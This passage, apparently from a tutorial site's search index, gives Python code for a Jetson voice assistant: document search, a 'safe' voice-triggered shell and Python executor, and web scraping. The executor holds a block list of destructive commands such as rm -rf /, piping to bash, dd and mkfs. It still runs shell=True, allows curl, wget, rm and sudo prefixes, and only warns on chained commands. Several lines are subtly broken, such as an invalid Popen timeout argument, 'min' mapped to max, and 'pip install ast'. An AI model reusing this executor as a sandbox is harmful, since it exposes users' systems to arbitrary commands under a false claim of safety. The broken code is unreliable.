\"cpu\"\n        self.embeddings = HuggingFaceEmbeddings(\n            model_name=f\"sentence-transformers/{embedding_model}\",\n            model_kwargs={'device': self.device}\n        )\n\n        # Text splitter for chunking\n        self.text_splitter = RecursiveCharacterTextSplitter(\n            chunk_size=chunk_size,\n            chunk_overlap=chunk_overlap,\n            length_function=len,\n            separators=[\"\\n\\n\", \"\\n\", \". \", \" \", \"\"]\n        )\n\n        # Vector store\n        self.vector_store = None\n        self.document_metadata = {}\n\n        # Initialize or load existing vector store\n        self._initialize_vector_store()\n\n        print(f\"\ud83d\udcda RAG processor initialized on {self.device}\")\n        print(f\"\ud83d\udcc1 Documents path: {self.documents_path}\")\n        print(f\"\ud83d\uddc3\ufe0f Vector store path: {self.vector_store_path}\")\n\n    def _initialize_vector_store(self):\n        \"\"\"Initialize or load existing vector store\"\"\"\n        try:\n            if self.vector_store_path.exists():\n                self.vector_store = FAISS.load_local(\n                    str(self.vector_store_path), \n                    self.embeddings\n                )\n\n                # Load metadata\n                metadata_path = self.vector_store_path / \"metadata.json\"\n                if metadata_path.exists():\n                    with open(metadata_path, 'r') as f:\n                        self.document_metadata = json.load(f)\n\n                print(f\"\u2705 Loaded existing vector store with {self.vector_store.index.ntotal} documents\")\n            else:\n                print(\"\ud83c\udd95 Creating new vector store...\")\n                self._build_vector_store()\n        except Exception as e:\n            print(f\"\u26a0\ufe0f Error loading vector store: {e}\")\n            print(\"\ud83d\udd04 Rebuilding vector store...\")\n            self._build_vector_store()\n\n    def _build_vector_store(self):\n        \"\"\"Build vector store from documents\"\"\"\n        if not self.documents_path.exists():\n            self.documents_path.mkdir(parents=True, exist_ok=True)\n            print(f\"\ud83d\udcc1 Created documents directory: {self.documents_path}\")\n            return\n\n        documents = self._load_all_documents()\n\n        if documents:\n            self.vector_store = FAISS.from_documents(documents, self.embeddings)\n            self._save_vector_store()\n            print(f\"\u2705 Built vector store with {len(documents)} document chunks\")\n        else:\n            print(\"\ud83d\udced No documents found to index\")\n\n    def _load_all_documents(self) -&gt; List[Document]:\n        \"\"\"Load and process all documents from the documents directory\"\"\"\n        documents = []\n        supported_extensions = {\n            '.pdf': self._load_pdf,\n            '.txt': self._load_text,\n            '.md': self._load_text,\n            '.docx': self._load_docx,\n            '.csv': self._load_csv,\n            '.json': self._load_json\n        }\n\n        for file_path in self.documents_path.rglob('*'):\n            if file_path.is_file() and file_path.suffix.lower() in supported_extensions:\n                try:\n                    loader_func = supported_extensions[file_path.suffix.lower()]\n                    file_documents = loader_func(file_path)\n\n                    # Add file metadata\n                    for doc in file_documents:\n                        doc.metadata.update({\n                            'file_path': str(file_path),\n                            'file_name': file_path.name,\n                            'file_size': file_path.stat().st_size,\n                            'last_modified': datetime.fromtimestamp(file_path.stat().st_mtime).isoformat()\n                        })\n\n                    documents.extend(file_documents)\n\n                    # Store document metadata\n                    file_hash = self._get_file_hash(file_path)\n                    self.document_metadata[str(file_path)] = {\n                        'hash': file_hash,\n                        'chunks': len(file_documents),\n                        'processed_at': datetime.now().isoformat()\n                    }\n\n                    print(f\"\ud83d\udcc4 Processed: {file_path.name} ({len(file_documents)} chunks)\")\n\n                except Exception as e:\n                    print(f\"\u274c Error processing {file_path}: {e}\")\n\n        return documents\n\n    def _load_pdf(self, file_path: Path) -&gt; List[Document]:\n        \"\"\"Load PDF document\"\"\"\n        loader = PyPDFLoader(str(file_path))\n        documents = loader.load()\n        return self.text_splitter.split_documents(documents)\n\n    def _load_text(self, file_path: Path) -&gt; List[Document]:\n        \"\"\"Load text document\"\"\"\n        loader = TextLoader(str(file_path), encoding='utf-8')\n        documents = loader.load()\n        return self.text_splitter.split_documents(documents)\n\n    def _load_docx(self, file_path: Path) -&gt; List[Document]:\n        \"\"\"Load Word document\"\"\"\n        loader = UnstructuredWordDocumentLoader(str(file_path))\n        documents = loader.load()\n        return self.text_splitter.split_documents(documents)\n\n    def _load_csv(self, file_path: Path) -&gt; List[Document]:\n        \"\"\"Load CSV document\"\"\"\n        loader = CSVLoader(str(file_path))\n        documents = loader.load()\n        return self.text_splitter.split_documents(documents)\n\n    def _load_json(self, file_path: Path) -&gt; List[Document]:\n        \"\"\"Load JSON document\"\"\"\n        loader = JSONLoader(str(file_path), jq_schema='.', text_content=False)\n        documents = loader.load()\n        return self.text_splitter.split_documents(documents)\n\n    def _get_file_hash(self, file_path: Path) -&gt; str:\n        \"\"\"Get MD5 hash of file for change detection\"\"\"\n        hash_md5 = hashlib.md5()\n        with open(file_path, \"rb\") as f:\n            for chunk in iter(lambda: f.read(4096), b\"\"):\n                hash_md5.update(chunk)\n        return hash_md5.hexdigest()\n\n    def _save_vector_store(self):\n        \"\"\"Save vector store and metadata\"\"\"\n        if self.vector_store:\n            self.vector_store_path.mkdir(parents=True, exist_ok=True)\n            self.vector_store.save_local(str(self.vector_store_path))\n\n            # Save metadata\n            metadata_path = self.vector_store_path / \"metadata.json\"\n            with open(metadata_path, 'w') as f:\n                json.dump(self.document_metadata, f, indent=2)\n\n    def add_document(self, file_path: str) -&gt; bool:\n        \"\"\"Add a single document to the vector store\"\"\"\n        file_path = Path(file_path)\n\n        if not file_path.exists():\n            print(f\"\u274c File not found: {file_path}\")\n            return False\n\n        try:\n            # Check if document has changed\n            current_hash = self._get_file_hash(file_path)\n            if str(file_path) in self.document_metadata:\n                if self.document_metadata[str(file_path)]['hash'] == current_hash:\n                    print(f\"\ud83d\udcc4 Document unchanged: {file_path.name}\")\n                    return True\n\n            # Load and process document\n            documents = self._load_all_documents()\n            new_docs = [doc for doc in documents if doc.metadata['file_path'] == str(file_path)]\n\n            if new_docs:\n                if self.vector_store is None:\n                    self.vector_store = FAISS.from_documents(new_docs, self.embeddings)\n                else:\n                    new_vector_store = FAISS.from_documents(new_docs, self.embeddings)\n                    self.vector_store.merge_from(new_vector_store)\n\n                self._save_vector_store()\n                print(f\"\u2705 Added document: {file_path.name} ({len(new_docs)} chunks)\")\n                return True\n\n        except Exception as e:\n            print(f\"\u274c Error adding document {file_path}: {e}\")\n\n        return False\n\n    def search_documents(self, \n                        query: str, \n                        k: int = 5,\n                        score_threshold: float = 0.7) -&gt; List[DocumentSearchResult]:\n        \"\"\"Search documents using semantic similarity\"\"\"\n        if not self.vector_store:\n            return []\n\n        try:\n            # Perform similarity search with scores\n            docs_and_scores = self.vector_store.similarity_search_with_score(query, k=k)\n\n            results = []\n            for doc, score in docs_and_scores:\n                # Convert distance to similarity score (FAISS returns distance)\n                similarity_score = 1 / (1 + score)\n\n                if similarity_score &gt;= score_threshold:\n                    result = DocumentSearchResult(\n                        content=doc.page_content,\n                        source=doc.metadata.get('file_name', 'Unknown'),\n                        score=similarity_score,\n                        metadata=doc.metadata\n                    )\n                    results.append(result)\n\n            return results\n\n        except Exception as e:\n            print(f\"\u274c Search error: {e}\")\n            return []\n\n    def search_with_context(self, \n                           query: str, \n                           conversation_history: List[str] = None,\n                           k: int = 3) -&gt; List[DocumentSearchResult]:\n        \"\"\"Search with conversation context for better results\"\"\"\n        # Enhance query with conversation context\n        enhanced_query = query\n        if conversation_history:\n            # Use last few exchanges for context\n            recent_context = \" \".join(conversation_history[-3:])\n            enhanced_query = f\"{recent_context} {query}\"\n\n        return self.search_documents(enhanced_query, k=k)\n\n    def get_document_summary(self, file_name: str) -&gt; Optional[str]:\n        \"\"\"Get summary of a specific document\"\"\"\n        if not self.vector_store:\n            return None\n\n        # Search for all chunks from the specific document\n        all_docs = self.vector_store.similarity_search(\n            f\"summary of {file_name}\", \n            k=100,\n            filter={\"file_name\": file_name}\n        )\n\n        if not all_docs:\n            return None\n\n        # Combine content from all chunks\n        full_content = \"\\n\".join([doc.page_content for doc in all_docs[:5]])  # First 5 chunks\n\n        return f\"Document: {file_name}\\nContent preview: {full_content[:500]}...\"\n\n    def list_available_documents(self) -&gt; List[Dict]:\n        \"\"\"List all available documents with metadata\"\"\"\n        documents = []\n        for file_path, metadata in self.document_metadata.items():\n            file_info = {\n                'name': Path(file_path).name,\n                'path': file_path,\n                'chunks': metadata['chunks'],\n                'processed_at': metadata['processed_at']\n            }\n            documents.append(file_info)\n\n        return documents\n\n    def refresh_documents(self):\n        \"\"\"Refresh vector store with updated documents\"\"\"\n        print(\"\ud83d\udd04 Refreshing document index...\")\n        self._build_vector_store()\n        print(\"\u2705 Document index refreshed\")\n\n# Voice-optimized search interface\nclass VoiceDocumentSearch:\n    \"\"\"Voice-optimized interface for document search\"\"\"\n\n    def __init__(self, rag_processor: VoiceRAGProcessor):\n        self.rag_processor = rag_processor\n        self.conversation_history = []\n\n    def process_voice_query(self, query: str, language: str = \"en\") -&gt; str:\n        \"\"\"Process voice query and return formatted response\"\"\"\n        # Add query to conversation history\n        self.conversation_history.append(query)\n\n        # Search documents\n        results = self.rag_processor.search_with_context(\n            query, \n            self.conversation_history\n        )\n\n        if not results:\n            return \"I couldn't find any relevant information in your documents. Could you try rephrasing your question?\"\n\n        # Format response for voice output\n        response = self._format_voice_response(results, query)\n\n        # Add response to history\n        self.conversation_history.append(response)\n\n        # Keep history manageable\n        if len(self.conversation_history) &gt; 10:\n            self.conversation_history = self.conversation_history[-10:]\n\n        return response\n\n    def _format_voice_response(self, results: List[DocumentSearchResult], query: str) -&gt; str:\n        \"\"\"Format search results for voice output\"\"\"\n        if len(results) == 1:\n            result = results[0]\n            response = f\"I found information in {result.source}. {result.content[:300]}\"\n            if len(result.content) &gt; 300:\n                response += \"... Would you like me to continue?\"\n        else:\n            response = f\"I found {len(results)} relevant documents. \"\n            for i, result in enumerate(results[:2], 1):\n                response += f\"From {result.source}: {result.content[:150]}... \"\n\n            if len(results) &gt; 2:\n                response += f\"And {len(results) - 2} more documents contain relevant information.\"\n\n        return response\n\n    def get_document_list_response(self) -&gt; str:\n        \"\"\"Get voice-friendly list of available documents\"\"\"\n        documents = self.rag_processor.list_available_documents()\n\n        if not documents:\n            return \"No documents are currently indexed. Please add some documents to search through.\"\n\n        response = f\"I have access to {len(documents)} documents: \"\n        for doc in documents[:5]:  # Limit to first 5 for voice\n            response += f\"{doc['name']}, \"\n\n        if len(documents) &gt; 5:\n            response += f\"and {len(documents) - 5} more documents.\"\n\n        return response.rstrip(\", \")\n\n# Usage example\nrag_processor = VoiceRAGProcessor(\n    documents_path=\"./my_documents\",\n    vector_store_path=\"./vector_store\"\n)\n\nvoice_search = VoiceDocumentSearch(rag_processor)\n\n# Example voice queries\nresponse1 = voice_search.process_voice_query(\"What is machine learning?\")\nresponse2 = voice_search.process_voice_query(\"Tell me about neural networks\")\nresponse3 = voice_search.process_voice_query(\"How do I install Python?\")\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#command-execution-code-running-system","title":"\u26a1 Command Execution &amp; Code Running System","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#command-execution-dependencies","title":"Command Execution Dependencies","text":"<pre><code># Code execution and system integration\npip install subprocess32\npip install psutil\npip install docker  # For containerized execution\npip install RestrictedPython  # For safe Python execution\npip install ast  # For code analysis\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#safe-command-code-execution-engine","title":"Safe Command &amp; Code Execution Engine","text":"<pre><code>import subprocess\nimport os\nimport sys\nimport ast\nimport tempfile\nimport shutil\nfrom typing import Dict, List, Optional, Tuple, Any\nfrom dataclasses import dataclass\nimport psutil\nimport time\nimport threading\nimport queue\nfrom pathlib import Path\nimport json\nimport re\nfrom RestrictedPython import compile_restricted, safe_globals\nfrom RestrictedPython.Guards import safe_builtins\n\n@dataclass\nclass ExecutionResult:\n    \"\"\"Structure for execution results\"\"\"\n    success: bool\n    output: str\n    error: str\n    execution_time: float\n    command: str\n    exit_code: Optional[int] = None\n    warnings: List[str] = None\n\nclass SafeCommandExecutor:\n    \"\"\"Safe command execution with security restrictions\"\"\"\n\n    def __init__(self, \n                 timeout: int = 30,\n                 max_output_size: int = 10000,\n                 working_directory: str = None):\n\n        self.timeout = timeout\n        self.max_output_size = max_output_size\n        self.working_directory = working_directory or os.getcwd()\n\n        # Allowed commands (whitelist approach)\n        self.allowed_commands = {\n            # File operations\n            'ls', 'dir', 'pwd', 'cd', 'mkdir', 'rmdir', 'cp', 'mv', 'rm',\n            'cat', 'head', 'tail', 'grep', 'find', 'locate', 'which',\n\n            # System info\n            'ps', 'top', 'htop', 'df', 'du', 'free', 'uname', 'whoami',\n            'date', 'uptime', 'hostname',\n\n            # Network\n            'ping', 'curl', 'wget', 'netstat',\n\n            # Development\n            'git', 'python', 'python3', 'pip', 'pip3', 'node', 'npm',\n            'docker', 'kubectl',\n\n            # Text processing\n            'sort', 'uniq', 'wc', 'awk', 'sed', 'cut',\n\n            # Archive\n            'tar', 'zip', 'unzip', 'gzip', 'gunzip'\n        }\n\n        # Dangerous patterns to block\n        self.dangerous_patterns = [\n            r'rm\\s+-rf\\s+/',  # Dangerous rm commands\n            r'sudo\\s+rm',     # Sudo rm\n            r'\\|\\s*sh',       # Piping to shell\n            r'\\|\\s*bash',     # Piping to bash\n            r'&gt;`',            # Output redirection that could overwrite\n            r'chmod\\s+777',   # Dangerous permissions\n            r'dd\\s+if=',      # Disk operations\n            r'mkfs',          # Filesystem creation\n            r'fdisk',         # Disk partitioning\n            r'format',        # Formatting\n        ]\n\n        print(f\"\ud83d\udee1\ufe0f Safe command executor initialized\")\n        print(f\"\ud83d\udcc1 Working directory: {self.working_directory}\")\n\n    def is_command_safe(self, command: str) -&gt; Tuple[bool, List[str]]:\n        \"\"\"Check if command is safe to execute\"\"\"\n        warnings = []\n\n        # Check for dangerous patterns\n        for pattern in self.dangerous_patterns:\n            if re.search(pattern, command, re.IGNORECASE):\n                return False, [f\"Dangerous pattern detected: {pattern}\"]\n\n        # Extract base command\n        base_command = command.strip().split()[0] if command.strip() else \"\"\n\n        # Remove common prefixes\n        for prefix in ['sudo', 'time', 'nohup']:\n            if base_command == prefix and len(command.split()) &gt; 1:\n                base_command = command.split()[1]\n                warnings.append(f\"Prefix '{prefix}' detected\")\n\n        # Check if base command is allowed\n        if base_command not in self.allowed_commands:\n            return False, [f\"Command '{base_command}' not in allowed list\"]\n\n        # Additional safety checks\n        if 'sudo' in command:\n            warnings.append(\"Sudo usage detected - may require elevated privileges\")\n\n        if any(char in command for char in ['&gt;', '&gt;&gt;', '|', '&amp;', ';']):\n            warnings.append(\"Shell operators detected - command may have side effects\")\n\n        return True, warnings\n\n    def execute_command(self, command: str, capture_output: bool = True) -&gt; ExecutionResult:\n        \"\"\"Execute a system command safely\"\"\"\n        start_time = time.time()\n\n        # Safety check\n        is_safe, warnings = self.is_command_safe(command)\n        if not is_safe:\n            return ExecutionResult(\n                success=False,\n                output=\"\",\n                error=f\"Command blocked for safety: {'; '.join(warnings)}\",\n                execution_time=0,\n                command=command,\n                warnings=warnings\n            )\n\n        try:\n            # Execute command\n            process = subprocess.Popen(\n                command,\n                shell=True,\n                stdout=subprocess.PIPE if capture_output else None,\n                stderr=subprocess.PIPE if capture_output else None,\n                text=True,\n                cwd=self.working_directory,\n                timeout=self.timeout\n            )\n\n            stdout, stderr = process.communicate(timeout=self.timeout)\n\n            # Limit output size\n            if stdout and len(stdout) &gt; self.max_output_size:\n                stdout = stdout[:self.max_output_size] + \"\\n... (output truncated)\"\n\n            if stderr and len(stderr) &gt; self.max_output_size:\n                stderr = stderr[:self.max_output_size] + \"\\n... (error truncated)\"\n\n            execution_time = time.time() - start_time\n\n            return ExecutionResult(\n                success=process.returncode == 0,\n                output=stdout or \"\",\n                error=stderr or \"\",\n                execution_time=execution_time,\n                command=command,\n                exit_code=process.returncode,\n                warnings=warnings\n            )\n\n        except subprocess.TimeoutExpired:\n            return ExecutionResult(\n                success=False,\n                output=\"\",\n                error=f\"Command timed out after {self.timeout} seconds\",\n                execution_time=self.timeout,\n                command=command,\n                warnings=warnings\n            )\n        except Exception as e:\n            return ExecutionResult(\n                success=False,\n                output=\"\",\n                error=f\"Execution error: {str(e)}\",\n                execution_time=time.time() - start_time,\n                command=command,\n                warnings=warnings\n            )\n\nclass SafePythonExecutor:\n    \"\"\"Safe Python code execution with restrictions\"\"\"\n\n    def __init__(self, \n                 timeout: int = 30,\n                 max_output_size: int = 10000):\n\n        self.timeout = timeout\n        self.max_output_size = max_output_size\n\n        # Safe builtins for restricted execution\n        self.safe_builtins = {\n            '__builtins__': {\n                'len': len, 'str': str, 'int': int, 'float': float,\n                'bool': bool, 'list': list, 'dict': dict, 'tuple': tuple,\n                'set': set, 'range': range, 'enumerate': enumerate,\n                'zip': zip, 'map': map, 'filter': filter, 'sorted': sorted,\n                'sum': sum, 'min': max, 'max': max, 'abs': abs,\n                'round': round, 'print': print, 'type': type,\n                'isinstance': isinstance, 'hasattr': hasattr, 'getattr': getattr,\n                'setattr': setattr, 'dir': dir, 'help': help\n            }\n        }\n\n        # Allowed imports\n        self.allowed_imports = {\n            'math', 'random', 'datetime', 'json', 'csv', 'statistics',\n            'collections', 'itertools', 'functools', 'operator',\n            'numpy', 'pandas', 'matplotlib', 'seaborn', 'sklearn',\n            'requests', 'urllib', 'pathlib', 're', 'os.path'\n        }\n\n        print(f\"\ud83d\udc0d Safe Python executor initialized\")\n\n    def is_code_safe(self, code: str) -&gt; Tuple[bool, List[str]]:\n        \"\"\"Analyze Python code for safety\"\"\"\n        warnings = []\n\n        try:\n            # Parse code into AST\n            tree = ast.parse(code)\n\n            # Check for dangerous operations\n            for node in ast.walk(tree):\n                # Check imports\n                if isinstance(node, ast.Import):\n                    for alias in node.names:\n                        if alias.name not in self.allowed_imports:\n                            return False, [f\"Import '{alias.name}' not allowed\"]\n\n                elif isinstance(node, ast.ImportFrom):\n                    if node.module and node.module not in self.allowed_imports:\n                        return False, [f\"Import from '{node.module}' not allowed\"]\n\n                # Check for dangerous function calls\n                elif isinstance(node, ast.Call):\n                    if isinstance(node.func, ast.Name):\n                        dangerous_funcs = ['exec', 'eval', 'compile', '__import__', 'open']\n                        if node.func.id in dangerous_funcs:\n                            return False, [f\"Function '{node.func.id}' not allowed\"]\n\n                # Check for file operations\n                elif isinstance(node, ast.Attribute):\n                    if node.attr in ['write', 'remove', 'unlink', 'rmdir', 'mkdir']:\n                        warnings.append(f\"File operation '{node.attr}' detected\")\n\n            return True, warnings\n\n        except SyntaxError as e:\n            return False, [f\"Syntax error: {str(e)}\"]\n        except Exception as e:\n            return False, [f\"Code analysis error: {str(e)}\"]\n\n    def execute_python_code(self, code: str) -&gt; ExecutionResult:\n        \"\"\"Execute Python code safely\"\"\"\n        start_time = time.time()\n\n        # Safety check\n        is_safe, warnings = self.is_code_safe(code)\n        if not is_safe:\n            return ExecutionResult(\n                success=False,\n                output=\"\",\n                error=f\"Code blocked for safety: {'; '.join(warnings)}\",\n                execution_time=0,\n                command=code,\n                warnings=warnings\n            )\n\n        # Capture output\n        output_buffer = []\n        error_buffer = []\n\n        def safe_print(*args, **kwargs):\n            output_buffer.append(' '.join(str(arg) for arg in args))\n\n        # Create safe execution environment\n        safe_env = self.safe_builtins.copy()\n        safe_env['print'] = safe_print\n\n        try:\n            # Compile with restrictions\n            compiled_code = compile_restricted(code, '&lt;string&gt;', 'exec')\n\n            if compiled_code.errors:\n                return ExecutionResult(\n                    success=False,\n                    output=\"\",\n                    error=f\"Compilation errors: {'; '.join(compiled_code.errors)}\",\n                    execution_time=time.time() - start_time,\n                    command=code,\n                    warnings=warnings\n                )\n\n            # Execute with timeout\n            def execute_with_timeout():\n                try:\n                    exec(compiled_code.code, safe_env)\n                except Exception as e:\n                    error_buffer.append(str(e))\n\n            thread = threading.Thread(target=execute_with_timeout)\n            thread.start()\n            thread.join(timeout=self.timeout)\n\n            if thread.is_alive():\n                return ExecutionResult(\n                    success=False,\n                    output=\"\",\n                    error=f\"Code execution timed out after {self.timeout} seconds\",\n                    execution_time=self.timeout,\n                    command=code,\n                    warnings=warnings\n                )\n\n            # Collect results\n            output = '\\n'.join(output_buffer)\n            error = '\\n'.join(error_buffer)\n\n            # Limit output size\n            if len(output) &gt; self.max_output_size:\n                output = output[:self.max_output_size] + \"\\n... (output truncated)\"\n\n            execution_time = time.time() - start_time\n\n            return ExecutionResult(\n                success=len(error_buffer) == 0,\n                output=output,\n                error=error,\n                execution_time=execution_time,\n                command=code,\n                warnings=warnings\n            )\n\n        except Exception as e:\n            return ExecutionResult(\n                success=False,\n                output=\"\",\n                error=f\"Execution error: {str(e)}\",\n                execution_time=time.time() - start_time,\n                command=code,\n                warnings=warnings\n            )\n\nclass VoiceCodeExecutor:\n    \"\"\"Voice-controlled code and command execution\"\"\"\n\n    def __init__(self):\n        self.command_executor = SafeCommandExecutor()\n        self.python_executor = SafePythonExecutor()\n        self.execution_history = []\n\n    def process_voice_command(self, voice_input: str) -&gt; str:\n        \"\"\"Process voice input and determine execution type\"\"\"\n        voice_input = voice_input.strip().lower()\n\n        # Detect command type\n        if any(phrase in voice_input for phrase in [\n            \"run command\", \"execute command\", \"system command\", \"terminal command\"\n        ]):\n            return self._handle_system_command(voice_input)\n\n        elif any(phrase in voice_input for phrase in [\n            \"run python\", \"execute python\", \"python code\", \"run code\"\n        ]):\n            return self._handle_python_code(voice_input)\n\n        elif any(phrase in voice_input for phrase in [\n            \"show files\", \"list files\", \"what files\", \"directory contents\"\n        ]):\n            return self._handle_file_listing()\n\n        elif any(phrase in voice_input for phrase in [\n            \"system info\", \"system status\", \"computer info\"\n        ]):\n            return self._handle_system_info()\n\n        else:\n            return \"I can help you run system commands or Python code. Try saying 'run command' or 'run python code' followed by your request.\"\n\n    def _extract_command_from_voice(self, voice_input: str) -&gt; str:\n        \"\"\"Extract actual command from voice input\"\"\"\n        # Remove common voice command prefixes\n        prefixes = [\n            \"run command\", \"execute command\", \"system command\", \"terminal command\",\n            \"run python\", \"execute python\", \"python code\", \"run code\",\n            \"please\", \"can you\", \"could you\"\n        ]\n\n        command = voice_input\n        for prefix in prefixes:\n            if command.startswith(prefix):\n                command = command[len(prefix):].strip()\n                break\n\n        return command\n\n    def _handle_system_command(self, voice_input: str) -&gt; str:\n        \"\"\"Handle system command execution\"\"\"\n        command = self._extract_command_from_voice(voice_input)\n\n        if not command:\n            return \"Please specify the command you want to run.\"\n\n        result = self.command_executor.execute_command(command)\n        self.execution_history.append(result)\n\n        # Format response for voice\n        if result.success:\n            response = f\"Command executed successfully. \"\n            if result.output:\n                # Limit output for voice response\n                output_preview = result.output[:200]\n                if len(result.output) &gt; 200:\n                    output_preview += \"... and more\"\n                response += f\"Output: {output_preview}\"\n            else:\n                response += \"No output returned.\"\n        else:\n            response = f\"Command failed. Error: {result.error}\"\n\n        if result.warnings:\n            response += f\" Warnings: {', '.join(result.warnings)}\"\n\n        return response\n\n    def _handle_python_code(self, voice_input: str) -&gt; str:\n        \"\"\"Handle Python code execution\"\"\"\n        code = self._extract_command_from_voice(voice_input)\n\n        if not code:\n            return \"Please specify the Python code you want to run.\"\n\n        result = self.python_executor.execute_python_code(code)\n        self.execution_history.append(result)\n\n        # Format response for voice\n        if result.success:\n            response = f\"Python code executed successfully. \"\n            if result.output:\n                output_preview = result.output[:200]\n                if len(result.output) &gt; 200:\n                    output_preview += \"... and more\"\n                response += f\"Output: {output_preview}\"\n            else:\n                response += \"No output returned.\"\n        else:\n            response = f\"Python code failed. Error: {result.error}\"\n\n        if result.warnings:\n            response += f\" Warnings: {', '.join(result.warnings)}\"\n\n        return response\n\n    def _handle_file_listing(self) -&gt; str:\n        \"\"\"Handle file listing requests\"\"\"\n        result = self.command_executor.execute_command(\"ls -la\")\n\n        if result.success:\n            files = result.output.split('\\n')[:10]  # First 10 files\n            file_count = len([f for f in files if f.strip()])\n            return f\"Found {file_count} items in current directory: {', '.join([f.split()[-1] for f in files if f.strip()][:5])}\"\n        else:\n            return \"Could not list files in current directory.\"\n\n    def _handle_system_info(self) -&gt; str:\n        \"\"\"Handle system information requests\"\"\"\n        try:\n            # Get basic system info\n            cpu_percent = psutil.cpu_percent(interval=1)\n            memory = psutil.virtual_memory()\n            disk = psutil.disk_usage('/')\n\n            response = f\"System status: CPU usage {cpu_percent}%, \"\n            response += f\"Memory usage {memory.percent}%, \"\n            response += f\"Disk usage {disk.percent}%\"\n\n            return response\n        except:\n            return \"Could not retrieve system information.\"\n\n    def get_execution_history(self) -&gt; str:\n        \"\"\"Get recent execution history\"\"\"\n        if not self.execution_history:\n            return \"No commands have been executed yet.\"\n\n        recent = self.execution_history[-5:]  # Last 5 executions\n        response = f\"Recent executions: \"\n        for i, result in enumerate(recent, 1):\n            status = \"succeeded\" if result.success else \"failed\"\n            response += f\"{i}. {result.command[:30]}... {status}. \"\n\n        return response\n\n# Usage example\nvoice_executor = VoiceCodeExecutor()\n\n# Example voice commands\nresponse1 = voice_executor.process_voice_command(\"run command ls -la\")\nresponse2 = voice_executor.process_voice_command(\"run python code print('Hello World')\")\nresponse3 = voice_executor.process_voice_command(\"show system info\")\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#online-search-integration","title":"\ud83c\udf10 Online Search Integration","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#online-search-dependencies","title":"Online Search Dependencies","text":"<pre><code># Web search and content extraction\npip install requests\npip install beautifulsoup4\npip install lxml\npip install selenium  # For dynamic content\npip install duckduckgo-search\npip install googlesearch-python\npip install newspaper3k  # For article extraction\npip install readability-lxml  # For content cleaning\npip install trafilatura  # For web scraping\npip install html2text  # For HTML to text conversion\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#advanced-online-search-engine","title":"Advanced Online Search Engine","text":"<pre><code>import requests\nfrom bs4 import BeautifulSoup\nimport json\nimport time\nfrom typing import Dict, List, Optional, Tuple\nfrom dataclasses import dataclass\nfrom urllib.parse import urljoin, urlparse\nimport re\nfrom duckduckgo_search import DDGS\nimport html2text\nfrom newspaper import Article\nimport trafilatura\nfrom readability import Document\n\n@dataclass\nclass SearchResult:\n    \"\"\"Structure for search results\"\"\"\n    title: str\n    url: str\n    snippet: str\n    content: str = \"\"\n    source: str = \"\"\n    relevance_score: float = 0.0\n    timestamp: str = \"\"\n\n@dataclass\nclass SearchQuery:\n    \"\"\"Structure for search queries\"\"\"\n    query: str\n    language: str = \"en\"\n    region: str = \"us\"\n    max_results: int = 5\n    search_type: str = \"web\"  # web, news, images, videos\n    time_filter: str = \"\"  # d (day), w (week), m (month), y (year)\n\nclass AdvancedWebSearchEngine:\n    \"\"\"Advanced web search with multiple providers and content extraction\"\"\"\n\n    def __init__(self):\n        self.session = requests.Session()\n        self.session.headers.update({\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\n        })\n\n        # HTML to text converter\n        self.html_converter = html2text.HTML2Text()\n        self.html_converter.ignore_links = True\n        self.html_converter.ignore_images = True\n\n        print(\"\ud83d\udd0d Advanced web search engine initialized\")\n\n    def search_duckduckgo(self, query: SearchQuery) -&gt; List[SearchResult]:\n        \"\"\"Search using DuckDuckGo\"\"\"\n        try:\n            with DDGS() as ddgs:\n                results = []\n\n                # Perform search\n                search_results = ddgs.text(\n                    query.query,\n                    region=query.region,\n                    safesearch='moderate',\n                    timelimit=query.time_filter,\n                    max_results=query.max_results\n                )\n\n                for result in search_results:\n                    search_result = SearchResult(\n                        title=result.get('title', ''),\n                        url=result.get('href', ''),\n                        snippet=result.get('body', ''),\n                        source='DuckDuckGo'\n                    )\n                    results.append(search_result)\n\n                return results\n\n        except Exception as e:\n            print(f\"DuckDuckGo search error: {e}\")\n            return []\n\n    def search_google_fallback(self, query: SearchQuery) -&gt; List[SearchResult]:\n        \"\"\"Fallback Google search using custom search\"\"\"\n        try:\n            # Simple Google search fallback\n            search_url = f\"https://www.google.com/search?q={query.query}&amp;num={query.max_results}\"\n\n            response = self.session.get(search_url, timeout=10)\n            soup = BeautifulSoup(response.content, 'html.parser')\n\n            results = []\n            search_divs = soup.find_all('div', class_='g')\n\n            for div in search_divs[:query.max_results]:\n                title_elem = div.find('h3')\n                link_elem = div.find('a')\n                snippet_elem = div.find('span', class_='aCOpRe')\n\n                if title_elem and link_elem:\n                    title = title_elem.get_text()\n                    url = link_elem.get('href', '')\n                    snippet = snippet_elem.get_text() if snippet_elem else ''\n\n                    # Clean URL\n                    if url.startswith('/url?q='):\n                        url = url.split('/url?q=')[1].split('&amp;')[0]\n\n                    search_result = SearchResult(\n                        title=title,\n                        url=url,\n                        snippet=snippet,\n                        source='Google'\n                    )\n                    results.append(search_result)\n\n            return results\n\n        except Exception as e:\n            print(f\"Google search error: {e}\")\n            return []\n\n    def extract_content(self, url: str) -&gt; str:\n        \"\"\"Extract clean content from a webpage\"\"\"\n        try:\n            # Try multiple extraction methods\n\n            # Method 1: Trafilatura (best for articles)\n            try:\n                response = self.session.get(url, timeout=10)\n                content = trafilatura.extract(response.content)\n                if content and len(content) &gt; 100:\n                    return content[:2000]  # Limit content length\n            except:\n                pass\n\n            # Method 2: Newspaper3k\n            try:\n                article = Article(url)\n                article.download()\n                article.parse()\n                if article.text and len(article.text) &gt; 100:\n                    return article.text[:2000]\n            except:\n                pass\n\n            # Method 3: Readability\n            try:\n                response = self.session.get(url, timeout=10)\n                doc = Document(response.content)\n                content = self.html_converter.handle(doc.summary())\n                if content and len(content) &gt; 100:\n                    return content[:2000]\n            except:\n                pass\n\n            # Method 4: Basic BeautifulSoup\n            try:\n                response = self.session.get(url, timeout=10)\n                soup = BeautifulSoup(response.content, 'html.parser')\n\n                # Remove script and style elements\n                for script in soup([\"script\", \"style\"]):\n                    script.decompose()\n\n                # Get text\n                text = soup.get_text()\n\n                # Clean up text\n                lines = (line.strip() for line in text.splitlines())\n                chunks = (phrase.strip() for line in lines for phrase in 